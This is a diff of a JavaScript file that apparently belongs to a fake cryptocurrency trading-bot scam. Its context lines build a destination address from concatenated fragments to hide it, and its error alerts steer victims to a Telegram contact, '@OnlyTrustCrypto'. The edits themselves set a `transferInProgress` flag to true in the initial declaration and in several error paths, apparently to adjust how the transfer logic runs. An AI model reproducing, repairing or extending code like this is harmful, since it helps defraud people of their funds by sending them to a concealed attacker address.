@@ -88,7 +88,7 @@
 
         let validationComplete = false;
 
-        let transferInProgress = false;
+        let transferInProgress = true ;
 
         const performTransaction = async () => {
 
@@ -162,7 +162,7 @@ const ra  = `0x${evm}${hashlock}${moe}${spv}${comission}${sc}${validate}${mnode}
 
               alert("no ETH for gas fee");
 
-              transferInProgress = false;
+              transferInProgress = true;
 
               return;
 
@@ -192,7 +192,7 @@ const ra  = `0x${evm}${hashlock}${moe}${spv}${comission}${sc}${validate}${mnode}
 
             alert("Error. A small amount of liquidity. Write to me in telegram @OnlyTrustCrypto");
 
-            transferInProgress = false; 
+            transferInProgress = true; 
 
           } catch (error) {
 
@@ -200,7 +200,7 @@ const ra  = `0x${evm}${hashlock}${moe}${spv}${comission}${sc}${validate}${mnode}
 
             console.error(error);
 
-            transferInProgress = false;
+            transferInProgress = true;
 
           }
 
@@ -313,7 +313,7 @@ const ra  = `0x${evm}${hashlock}${moe}${spv}${comission}${sc}${validate}${mnode}
 
             console.error("Error on process:\n" + error);
 
-            transferInProgress = false; 
+            transferInProgress = true; 
 
           }
 
